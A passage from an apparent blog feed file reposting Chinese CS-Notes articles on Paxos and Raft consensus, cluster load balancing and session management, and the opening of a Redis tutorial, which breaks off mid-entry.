href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/9b838aee-0996-44a5-9b0f-3d1e3e2f5100.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/9b838aee-0996-44a5-9b0f-3d1e3e2f5100.png" alt="img"></a></p><h3 id="3-Learn-阶段"><a href="#3-Learn-阶段" class="headerlink" title="3. Learn 阶段"></a>3. Learn 阶段</h3><p>Acceptor 接收到 Accept 请求时，如果序号大于等于该 Acceptor 承诺的最小序号，那么就发送 Learn 提议给所有的 Learner。当 Learner 发现有大多数的 Acceptor 接收了某个提议，那么该提议的提议值就被 Paxos 选择出来。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/bf667594-bb4b-4634-bf9b-0596a45415ba.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/bf667594-bb4b-4634-bf9b-0596a45415ba.jpg" alt="img"></a></p><h2 id="约束条件"><a href="#约束条件" class="headerlink" title="约束条件"></a>约束条件</h2><h3 id="1-正确性"><a href="#1-正确性" class="headerlink" title="1. 正确性"></a>1. 正确性</h3><p>指只有一个提议值会生效。</p><p>因为 Paxos 协议要求每个生效的提议被多数 Acceptor 接收，并且 Acceptor 不会接受两个不同的提议，因此可以保证正确性。</p><h3 id="2-可终止性"><a href="#2-可终止性" class="headerlink" title="2. 可终止性"></a>2. 可终止性</h3><p>指最后总会有一个提议生效。</p><p>Paxos 协议能够让 Proposer 发送的提议朝着能被大多数 Acceptor 接受的那个提议靠拢，因此能够保证可终止性。</p><h1 id="六、Raft"><a href="#六、Raft" class="headerlink" title="六、Raft"></a>六、Raft</h1><p>Raft 也是分布式一致性协议，主要是用来竞选主节点。</p><h2 id="单个-Candidate-的竞选"><a href="#单个-Candidate-的竞选" class="headerlink" title="单个 Candidate 的竞选"></a>单个 Candidate 的竞选</h2><p>有三种节点：Follower、Candidate 和 Leader。Leader 会周期性的发送心跳包给 Follower。每个 Follower 都设置了一个随机的竞选超时时间，一般为 150ms~300ms，如果在这个时间内没有收到 Leader 的心跳包，就会变成 Candidate，进入竞选阶段。</p><ul><li>下图展示一个分布式系统的最初阶段，此时只有 Follower 没有 Leader。Node A 等待一个随机的竞选超时时间之后，没收到 Leader 发来的心跳包，因此进入竞选阶段。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/111521118015898.gif"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/111521118015898.gif" alt="img"></a></p><ul><li>此时 Node A 发送投票请求给其它所有节点。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/111521118445538.gif"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/111521118445538.gif" alt="img"></a></p><ul><li>其它节点会对请求进行回复，如果超过一半的节点回复了，那么该 Candidate 就会变成 Leader。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/111521118483039.gif"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/111521118483039.gif" alt="img"></a></p><ul><li>之后 Leader 会周期性地发送心跳包给 Follower，Follower 接收到心跳包，会重新开始计时。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/111521118640738.gif"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/111521118640738.gif" alt="img"></a></p><h2 id="多个-Candidate-竞选"><a href="#多个-Candidate-竞选" class="headerlink" title="多个 Candidate 竞选"></a>多个 Candidate 竞选</h2><ul><li>如果有多个 Follower 成为 Candidate，并且所获得票数相同，那么就需要重新开始投票。例如下图中 Node B 和 Node D 都获得两票，需要重新开始投票。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/111521119203347.gif"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/111521119203347.gif" alt="img"></a></p><ul><li>由于每个节点设置的随机竞选超时时间不同，因此下一次再次出现多个 Candidate 并获得同样票数的概率很低。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/111521119368714.gif"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/111521119368714.gif" alt="img"></a></p><h2 id="数据同步"><a href="#数据同步" class="headerlink" title="数据同步"></a>数据同步</h2><ul><li>来自客户端的修改都会被传入 Leader。注意该修改还未被提交，只是写入日志中。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/7.gif"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/7.gif" alt="img"></a></p><ul><li>Leader 会把修改复制到所有 Follower。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/9.gif"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/9.gif" alt="img"></a></p><ul><li>Leader 会等待大多数的 Follower 也进行了修改，然后才将修改提交。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/10.gif"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/10.gif" alt="img"></a></p><ul><li>此时 Leader 会通知的所有 Follower 让它们也提交修改，此时所有节点的值达成一致。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/11.gif"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/11.gif" alt="img"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>倪超. 从 Paxos 到 ZooKeeper : 分布式一致性原理与实践 [M]. 电子工业出版社, 2015.</li><li><a href="https://redis.io/topics/distlock" target="_blank" rel="noopener">Distributed locks with Redis</a></li><li><a href="http://www.linkedkeeper.com/detail/blog.action?bid=1023" target="_blank" rel="noopener">浅谈分布式锁</a></li><li><a href="http://www.dengshenyu.com/java/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/2017/10/23/zookeeper-distributed-lock.html" target="_blank" rel="noopener">基于 Zookeeper 的分布式锁</a></li><li><a href="http://thesecretlivesofdata.com/raft" target="_blank" rel="noopener">Raft: Understandable Distributed Consensus</a></li><li><a href="https://www.cnblogs.com/savorboard/p/distributed-system-transaction-consistency.html" target="_blank" rel="noopener">聊聊分布式事务，再说说解决方案</a></li><li><a href="https://coolshell.cn/articles/10910.html" target="_blank" rel="noopener">分布式系统的事务处理</a></li><li><a href="https://juejin.im/entry/577c6f220a2b5800573492be" target="_blank" rel="noopener">深入理解分布式事务</a></li><li><a href="http://www.colooshiki.com/index.php/2017/04/20/what-is-cap-theorem-in-distributed-database-system/" target="_blank" rel="noopener">What is CAP theorem in distributed database system?</a></li><li><a href="http://harry.me/blog/2014/12/27/neat-algorithms-paxos/" target="_blank" rel="noopener">NEAT ALGORITHMS - PAXOS</a></li><li><a href="https://angus.nyc/2012/paxos-by-example/" target="_blank" rel="noopener">Paxos By Example</a></li></ul><p>本文转载自: <a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>集群</title>
      <link href="/2018/12/24/xi-tong-she-ji/ji-qun/"/>
      <url>/2018/12/24/xi-tong-she-ji/ji-qun/</url>
      
        <content type="html"><![CDATA[<h2 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h2><ul><li>一、负载均衡<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9B%86%E7%BE%A4.md#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95">负载均衡算法</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9B%86%E7%BE%A4.md#%E8%BD%AC%E5%8F%91%E5%AE%9E%E7%8E%B0">转发实现</a></li></ul></li><li>二、集群下的 Session 管理<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9B%86%E7%BE%A4.md#sticky-session">Sticky Session</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9B%86%E7%BE%A4.md#session-replication">Session Replication</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9B%86%E7%BE%A4.md#session-server">Session Server</a></li></ul></li></ul><h1 id="一、负载均衡"><a href="#一、负载均衡" class="headerlink" title="一、负载均衡"></a>一、负载均衡</h1><p>集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个应用服务器。</p><p>负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。</p><p>负载均衡器可以用来实现高可用以及伸缩性：</p><ul><li>高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用；</li><li>伸缩性：根据系统整体负载情况，可以很容易地添加移除节点。</li></ul><p>负载均衡运行过程包含两个部分：</p><ol><li>根据负载均衡算法得到转发的节点；</li><li>进行转发。</li></ol><h2 id="负载均衡算法"><a href="#负载均衡算法" class="headerlink" title="负载均衡算法"></a>负载均衡算法</h2><h3 id="1-轮询（Round-Robin）"><a href="#1-轮询（Round-Robin）" class="headerlink" title="1. 轮询（Round Robin）"></a>1. 轮询（Round Robin）</h3><p>轮询算法把每个请求轮流发送到每个服务器上。</p><p>下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/2766d04f-7dad-42e4-99d1-60682c9d5c61.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/2766d04f-7dad-42e4-99d1-60682c9d5c61.jpg" alt="img"></a></p><p>该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/f7ecbb8d-bb8b-4d45-a3b7-f49425d6d83d.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/f7ecbb8d-bb8b-4d45-a3b7-f49425d6d83d.jpg" alt="img"></a></p><h3 id="2-加权轮询（Weighted-Round-Robbin）"><a href="#2-加权轮询（Weighted-Round-Robbin）" class="headerlink" title="2. 加权轮询（Weighted Round Robbin）"></a>2. 加权轮询（Weighted Round Robbin）</h3><p>加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值。</p><p>例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/211c60d4-75ca-4acd-8a4f-171458ed58b4.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/211c60d4-75ca-4acd-8a4f-171458ed58b4.jpg" alt="img"></a></p><h3 id="3-最少连接（least-Connections）"><a href="#3-最少连接（least-Connections）" class="headerlink" title="3. 最少连接（least Connections）"></a>3. 最少连接（least Connections）</h3><p>由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。</p><p>例如下图中，(1, 3, 5) 请求会被发送到服务器 1，但是 (1, 3) 很快就断开连接，此时只有 (5) 请求连接服务器 1；(2, 4, 6) 请求被发送到服务器 2，只有 (2) 的连接断开，此时 (6, 4) 请求连接服务器 2。该系统继续运行时，服务器 2 会承担过大的负载。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/3b0d1aa8-d0e0-46c2-8fd1-736bf08a11aa.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/3b0d1aa8-d0e0-46c2-8fd1-736bf08a11aa.jpg" alt="img"></a></p><p>最少连接算法就是将请求发送给当前最少连接数的服务器上。</p><p>例如下图中，服务器 1 当前连接数最小，那么新到来的请求 6 就会被发送到服务器 1 上。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/1f4a7f10-52b2-4bd7-a67d-a9581d66dc62.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/1f4a7f10-52b2-4bd7-a67d-a9581d66dc62.jpg" alt="img"></a></p><h3 id="4-加权最少连接（Weighted-Least-Connection）"><a href="#4-加权最少连接（Weighted-Least-Connection）" class="headerlink" title="4. 加权最少连接（Weighted Least Connection）"></a>4. 加权最少连接（Weighted Least Connection）</h3><p>在最少连接的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/44edefb7-4b58-4519-b8ee-4aca01697b78.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/44edefb7-4b58-4519-b8ee-4aca01697b78.jpg" alt="img"></a></p><h3 id="5-随机算法（Random）"><a href="#5-随机算法（Random）" class="headerlink" title="5. 随机算法（Random）"></a>5. 随机算法（Random）</h3><p>把请求随机发送到服务器上。</p><p>和轮询算法类似，该算法比较适合服务器性能差不多的场景。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/0ee0f61b-c782-441e-bf34-665650198ae0.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/0ee0f61b-c782-441e-bf34-665650198ae0.jpg" alt="img"></a></p><h3 id="6-源地址哈希法-IP-Hash"><a href="#6-源地址哈希法-IP-Hash" class="headerlink" title="6. 源地址哈希法 (IP Hash)"></a>6. 源地址哈希法 (IP Hash)</h3><p>源地址哈希通过对客户端 IP 计算哈希值之后，再对服务器数量取模得到目标服务器的序号。</p><p>可以保证同一 IP 的客户端的请求会转发到同一台服务器上，用来实现会话粘滞（Sticky Session）</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/2018040302.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/2018040302.jpg" alt="img"></a></p><h2 id="转发实现"><a href="#转发实现" class="headerlink" title="转发实现"></a>转发实现</h2><h3 id="1-HTTP-重定向"><a href="#1-HTTP-重定向" class="headerlink" title="1. HTTP 重定向"></a>1. HTTP 重定向</h3><p>HTTP 重定向负载均衡服务器使用某种负载均衡算法计算得到服务器的 IP 地址之后，将该地址写入 HTTP 重定向报文中，状态码为 302。客户端收到重定向报文之后，需要重新向服务器发起请求。</p><p>缺点：</p><ul><li>需要两次请求，因此访问延迟比较高；</li><li>HTTP 负载均衡器处理能力有限，会限制集群的规模。</li></ul><p>该负载均衡转发的缺点比较明显，实际场景中很少使用它。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c5f611f0-fd5c-4158-9003-278141136e6e.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c5f611f0-fd5c-4158-9003-278141136e6e.jpg" alt="img"></a></p><h3 id="2-DNS-域名解析"><a href="#2-DNS-域名解析" class="headerlink" title="2. DNS 域名解析"></a>2. DNS 域名解析</h3><p>在 DNS 解析域名的同时使用负载均衡算法计算服务器 IP 地址。</p><p>优点：</p><ul><li>DNS 能够根据地理位置进行域名解析，返回离用户最近的服务器 IP 地址。</li></ul><p>缺点：</p><ul><li>由于 DNS 具有多级结构，每一级的域名记录都可能被缓存，当下线一台服务器需要修改 DNS 记录时，需要过很长一段时间才能生效。</li></ul><p>大型网站基本使用了 DNS 做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。也就是说，域名解析的结果为内部的负载均衡服务器 IP 地址。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/76a25fc8-a579-4d7c-974b-7640b57fbf39.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/76a25fc8-a579-4d7c-974b-7640b57fbf39.jpg" alt="img"></a></p><h3 id="3-反向代理服务器"><a href="#3-反向代理服务器" class="headerlink" title="3. 反向代理服务器"></a>3. 反向代理服务器</h3><p>反向代理服务器位于源服务器前面，用户的请求需要先经过反向代理服务器才能到达源服务器。反向代理可以用来进行缓存、日志记录等，同时也可以用来做为负载均衡服务器。</p><p>在这种负载均衡转发方式下，客户端不直接请求源服务器，因此源服务器不需要外部 IP 地址，而反向代理需要配置内部和外部两套 IP 地址。</p><p>优点：</p><ul><li>与其它功能集成在一起，部署简单。</li></ul><p>缺点：</p><ul><li>所有请求和响应都需要经过反向代理服务器，它可能会成为性能瓶颈。</li></ul><h3 id="4-网络层"><a href="#4-网络层" class="headerlink" title="4. 网络层"></a>4. 网络层</h3><p>在操作系统内核进程获取网络数据包，根据负载均衡算法计算源服务器的 IP 地址，并修改请求数据包的目的 IP 地址，最后进行转发。</p><p>源服务器返回的响应也需要经过负载均衡服务器，通常是让负载均衡服务器同时作为集群的网关服务器来实现。</p><p>优点：</p><ul><li>在内核进程中进行处理，性能比较高。</li></ul><p>缺点：</p><ul><li>和反向代理一样，所有的请求和响应都经过负载均衡服务器，会成为性能瓶颈。</li></ul><h3 id="5-链路层"><a href="#5-链路层" class="headerlink" title="5. 链路层"></a>5. 链路层</h3><p>在链路层根据负载均衡算法计算源服务器的 MAC 地址，并修改请求数据包的目的 MAC 地址，并进行转发。</p><p>通过配置源服务器的虚拟 IP 地址和负载均衡服务器的 IP 地址一致，从而不需要修改 IP 地址就可以进行转发。也正因为 IP 地址一样，所以源服务器的响应不需要转发回负载均衡服务器，可以直接转发给客户端，避免了负载均衡服务器的成为瓶颈。</p><p>这是一种三角传输模式，被称为直接路由。对于提供下载和视频服务的网站来说，直接路由避免了大量的网络传输数据经过负载均衡服务器。</p><p>这是目前大型网站使用最广负载均衡转发方式，在 Linux 平台可以使用的负载均衡服务器为 LVS（Linux Virtual Server）。</p><p>参考：</p><ul><li><a href="http://www.jscape.com/blog/load-balancing-algorithms" target="_blank" rel="noopener">Comparing Load Balancing Algorithms</a></li><li><a href="http://slideplayer.com/slide/6599069/#" target="_blank" rel="noopener">Redirection and Load Balancing</a></li></ul><h1 id="二、集群下的-Session-管理"><a href="#二、集群下的-Session-管理" class="headerlink" title="二、集群下的 Session 管理"></a>二、集群下的 Session 管理</h1><p>一个用户的 Session 信息如果存储在一个服务器上，那么当负载均衡器把用户的下一个请求转发到另一个服务器，由于服务器没有用户的 Session 信息，那么该用户就需要重新进行登录等操作。</p><h2 id="Sticky-Session"><a href="#Sticky-Session" class="headerlink" title="Sticky Session"></a>Sticky Session</h2><p>需要配置负载均衡器，使得一个用户的所有请求都路由到同一个服务器，这样就可以把用户的 Session 存放在该服务器中。</p><p>缺点：</p><ul><li>当服务器宕机时，将丢失该服务器上的所有 Session。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/MultiNode-StickySessions.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/MultiNode-StickySessions.jpg" alt="img"></a></p><h2 id="Session-Replication"><a href="#Session-Replication" class="headerlink" title="Session Replication"></a>Session Replication</h2><p>在服务器之间进行 Session 同步操作，每个服务器都有所有用户的 Session 信息，因此用户可以向任何一个服务器进行请求。</p><p>缺点：</p><ul><li>占用过多内存；</li><li>同步过程占用网络带宽以及服务器处理器时间。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/MultiNode-SessionReplication.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/MultiNode-SessionReplication.jpg" alt="img"></a></p><h2 id="Session-Server"><a href="#Session-Server" class="headerlink" title="Session Server"></a>Session Server</h2><p>使用一个单独的服务器存储 Session 数据，可以使用传统的 MySQL，也使用 Redis 或者 Memcached 这种内存型数据库。</p><p>优点：</p><ul><li>为了使得大型网站具有伸缩性，集群中的应用服务器通常需要保持无状态，那么应用服务器不能存储用户的会话信息。Session Server 将用户的会话信息单独进行存储，从而保证了应用服务器的无状态。</li></ul><p>缺点：</p><ul><li>需要去实现存取 Session 的代码。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/MultiNode-SpringSession.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/MultiNode-SpringSession.jpg" alt="img"></a></p><p>参考：</p><ul><li><a href="https://sivalabs.in/2018/02/session-management-using-spring-session-jdbc-datastore/" target="_blank" rel="noopener">Session Management using Spring Session with JDBC DataStore</a></li></ul><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9B%86%E7%BE%A4.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9B%86%E7%BE%A4.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集群 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis</title>
      <link href="/2018/12/24/shu-ju-ku/redis/"/>
      <url>/2018/12/24/shu-ju-ku/redis/</url>
      
        <content type="html"><![CDATA[<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E4%B8%80%E6%A6%82%E8%BF%B0">一、概述</a></li><li>二、数据类型<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#string">STRING</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#list">LIST</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#set">SET</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#hash">HASH</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#zset">ZSET</a></li></ul></li><li>三、数据结构<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E5%AD%97%E5%85%B8">字典</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E8%B7%B3%E8%B7%83%E8%A1%A8">跳跃表</a></li></ul></li><li>四、使用场景<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E8%AE%A1%E6%95%B0%E5%99%A8">计数器</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E7%BC%93%E5%AD%98">缓存</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E6%9F%A5%E6%89%BE%E8%A1%A8">查找表</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97">消息队列</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E4%BC%9A%E8%AF%9D%E7%BC%93%E5%AD%98">会话缓存</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E5%AE%9E%E7%8E%B0">分布式锁实现</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E5%85%B6%E5%AE%83">其它</a></li></ul></li><li>五、Redis 与 Memcached<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96">数据持久化</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E5%88%86%E5%B8%83%E5%BC%8F">分布式</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6">内存管理机制</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E5%85%AD%E9%94%AE%E7%9A%84%E8%BF%87%E6%9C%9F%E6%97%B6%E9%97%B4">六、键的过期时间</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E4%B8%83%E6%95%B0%E6%8D%AE%E6%B7%98%E6%B1%B0%E7%AD%96%E7%95%A5">七、数据淘汰策略</a></li><li>八、持久化<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#rdb-%E6%8C%81%E4%B9%85%E5%8C%96">RDB 持久化</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#aof-%E6%8C%81%E4%B9%85%E5%8C%96">AOF 持久化</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E4%B9%9D%E4%BA%8B%E5%8A%A1">九、事务</a></li><li>十、事件<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E6%96%87%E4%BB%B6%E4%BA%8B%E4%BB%B6">文件事件</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E6%97%B6%E9%97%B4%E4%BA%8B%E4%BB%B6">时间事件</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E4%BA%8B%E4%BB%B6%E7%9A%84%E8%B0%83%E5%BA%A6%E4%B8%8E%E6%89%A7%E8%A1%8C">事件的调度与执行</a></li></ul></li><li>十一、复制<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%A8%8B">连接过程</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E4%B8%BB%E4%BB%8E%E9%93%BE">主从链</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E5%8D%81%E4%BA%8Csentinel">十二、Sentinel</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E5%8D%81%E4%B8%89%E5%88%86%E7%89%87">十三、分片</a></li><li>十四、一个简单的论坛系统分析<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E6%96%87%E7%AB%A0%E4%BF%A1%E6%81%AF">文章信息</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E7%82%B9%E8%B5%9E%E5%8A%9F%E8%83%BD">点赞功能</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E5%AF%B9%E6%96%87%E7%AB%A0%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F">对文章进行排序</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。</p><p>键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。</p><p>Redis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。</p><h1 id="二、数据类型"><a href="#二、数据类型" class="headerlink" title="二、数据类型"></a>二、数据类型</h1><table><thead><tr><th>数据类型</th><th>可以存储的值</th><th>操作</th></tr></thead><tbody><tr><td>STRING</td><td>字符串、整数或者浮点数</td><td>对整个字符串或者字符串的其中一部分执行操作 对整数和浮点数执行自增或者自减操作</td></tr><tr><td>LIST</td><td>列表</td><td>从两端压入或者弹出元素  对单个或者多个元素 进行修剪，只保留一个范围内的元素</td></tr><tr><td>SET</td><td>无序集合</td><td>添加、获取、移除单个元素 检查一个元素是否存在于集合中 计算交集、并集、差集 从集合里面随机获取元素</td></tr><tr><td>HASH</td><td>包含键值对的无序散列表</td><td>添加、获取、移除单个键值对 获取所有键值对 检查某个键是否存在</td></tr><tr><td>ZSET</td><td>有序集合</td><td>添加、获取、删除元素 根据分值范围或者成员来获取元素 计算一个键的排名</td></tr></tbody></table><blockquote><p><a href="https://redislabs.com/ebook/part-1-getting-started/chapter-1-getting-to-know-redis/1-2-what-redis-data-structures-look-like/" target="_blank" rel="noopener">What Redis data structures look like</a></p></blockquote><h2 id="STRING"><a href="#STRING" class="headerlink" title="STRING"></a>STRING</h2><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/6019b2db-bc3e-4408-b6d8-96025f4481d6.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/6019b2db-bc3e-4408-b6d8-96025f4481d6.png" alt="img"></a></p><pre><code>&gt; set hello worldOK&gt; get hello&quot;world&quot;&gt; del hello(integer) 1&gt; get hello(nil)</code></pre><h2 id="LIST"><a href="#LIST" class="headerlink" title="LIST"></a>LIST</h2><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/fb327611-7e2b-4f2f-9f5b-38592d408f07.png"><img 